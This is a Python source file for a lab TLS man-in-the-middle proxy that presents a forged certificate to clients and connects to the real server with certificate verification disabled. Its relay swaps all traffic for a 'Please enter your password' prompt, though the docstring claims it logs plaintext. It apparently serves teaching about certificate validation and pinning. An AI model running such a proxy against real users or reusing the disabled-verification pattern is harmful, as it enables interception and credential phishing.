"""Educational TLS man-in-the-middle proxy for the lab scenarios.

The proxy terminates TLS from the client using an attacker-controlled
certificate, initiates a separate TLS session to the real server, and relays
plaintext between the two.  It demonstrates how disabling certificate
validation enables interception and why pinning stops the attack.

⚠️ For teaching purposes only.  Do not deploy against systems without consent.
"""
import argparse
import socket
import ssl
import threading
import time

import config
from certs import ensure_mitm_certs

STOP = threading.Event()

HOST = "127.0.0.1"

def relay(src, dst, name):
    """Relay decrypted data between sockets while optionally logging it.

    Args:
      src: Source socket object.
      dst: Destination socket object.
      name: Human-readable direction label for logging.

    Returns:
      None.

    Raises:
      None.  Errors are caught and the sockets are closed.

    Security Notes:
      - Demonstrates that once validation is bypassed, an attacker can read or
        modify plaintext transparently despite TLS on the wire.
    """
    try:
        while True:
            data = src.recv(4096)
            if not data:
                #print(f"[MITM] {name}: connection closed")
                break

            # Log cleartext as UTF-8 (ignore decode errors)
            try:
                # msg = data.decode("utf-8", errors="ignore")
                msg = "Please enter your password"
                data1 = msg.encode("utf-8")
                dst.sendall(data1)
            except Exception:
                print(f"[MITM] {name} >>> [binary data: {len(data)} bytes]")

    except (ssl.SSLError, OSError) as e:
        print(f"[MITM] Relay error in {name}: {e}")
    finally:
        try: src.close()
        except: pass
        try: dst.close()
        except: pass

def handle_client(client_tls):
    """Accept a victim TLS session and bridge it to the real server.

    Args:
      client_tls: TLS-wrapped socket from the victim client.

    Returns:
      None.

    Raises:
      None.  Exceptions trigger cleanup of the compromised session.

    Security Notes:
      - Creates a second ``SSLContext`` with ``CERT_NONE`` so the proxy trusts
        any certificate presented by the real server.  The client's security
        hinges entirely on its own validation/pinning settings.
      - Two independent TLS handshakes occur: one with the client (using the
        attacker's certificate) and one with the server (using normal trust).
    """

    try:
        #print(f"[MITM] Connecting to real server {HOST}:{config.PORT_SERVER_REAL}")
        real_sock = socket.create_connection((HOST, config.PORT_SERVER_REAL))

        # TLS context for connecting to real server
        server_ctx = ssl.create_default_context()
        # Prefer TLS1.3 for lab captures; fallback to TLS1.2 if unavailable.
        try:
            server_ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        except AttributeError:
            server_ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        # Disabling verification mirrors what an attacker-controlled proxy would
        # do: trust everything so it can connect to any target regardless of
        # certificate validity.
        server_ctx.check_hostname = False
        server_ctx.verify_mode = ssl.CERT_NONE

        # Second TLS handshake (proxy -> real server).  If this fails the MITM
        # cannot observe plaintext but the client still believes it connected to
        # the intended host because of the forged certificate.
        real_tls = server_ctx.wrap_socket(real_sock, server_hostname="localhost")
        # print("[MITM] TLS handshake with real server successful")

        # Start bidirectional relay (decrypted streams)
        threading.Thread(target=relay, args=(client_tls, real_tls, "C→S"), daemon=True).start()
        threading.Thread(target=relay, args=(real_tls, client_tls, "S→C"), daemon=True).start()

    except Exception as e:
        #print("[MITM] Error setting up client handler:", e)
        try: client_tls.close()
        except: pass

def main():
    """Start the MITM proxy and accept victim connections.

    Args:
      None.  CLI arguments are read from ``sys.argv``.

    Returns:
      None.

    Raises:
      SystemExit: Propagated if critical setup fails.

    Security Notes:
      - Loads the attacker certificate and private key created via
        ``ensure_mitm_certs``.  Clients that disable verification will accept
        this certificate, proving the danger of ``CERT_NONE``.
      - Acts as a TLS server toward the victim, so hostname checks and pinning
        on the client are the primary defense.
    """

    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=config.PORT_SERVER_MITM)
    args = parser.parse_args()

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    # Prefer TLS1.3 for lab captures; fallback to TLS1.2 if unavailable.
    try:
        context.minimum_version = ssl.TLSVersion.TLSv1_3
    except AttributeError:
        context.minimum_version = ssl.TLSVersion.TLSv1_2
    ensure_mitm_certs()
    context.load_cert_chain(certfile="mitm.crt", keyfile="mitm.key")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        #print(f"[MITM] Binding on {HOST}:{args.port}")
        s.bind((HOST, args.port))
        s.listen(5)
        #print(f"[MITM] Listening on {args.port}, forwarding to {config.PORT_SERVER_REAL}")

        while True:
            client_sock, addr = s.accept()
            #print(f"[MITM] Accepted connection from {addr}")
            try:
                # Victim TLS handshake terminates here using the attacker's
                # certificate; this succeeds only if the client skipped
                # validation or trusts the rogue certificate.
                client_tls = context.wrap_socket(client_sock, server_side=True)
                #print("[MITM] TLS handshake with client successful")
                threading.Thread(target=handle_client, args=(client_tls,), daemon=True).start()
            except Exception as e:
                #print("[MITM] Handshake with client failed:", e)
                client_sock.close()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        #print("[MITM] Fatal error:", e)
        time.sleep(1)
